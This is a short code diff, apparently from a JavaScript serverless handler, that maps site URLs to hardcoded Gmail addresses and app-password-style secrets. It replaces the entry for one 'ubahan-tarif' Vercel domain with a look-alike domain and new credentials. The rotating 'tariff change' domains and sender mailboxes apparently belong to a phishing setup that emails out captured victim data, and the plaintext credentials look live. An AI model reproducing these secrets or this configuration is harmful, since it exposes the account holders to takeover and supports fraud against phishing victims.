@@ -11,9 +11,9 @@ export default function handler(req, res) {
         email = 'sxxrhrh@gmail.com';
         pass = 'xefngcmysbpaxufj'; 
 
-    } else if(url == 'ubahan-tarif.vercel.app'){
-        email = 'giozx123456@gmail.com' ;
-        pass = 'uzbakbdzoclcyzft' ;
+    } else if(url == 'ubah-an-tarif.vercel.app'){
+        email = 'terakhir953@gmail.com' ;
+        pass = 'xysccffmmtefmvwm' ;
         
 
 
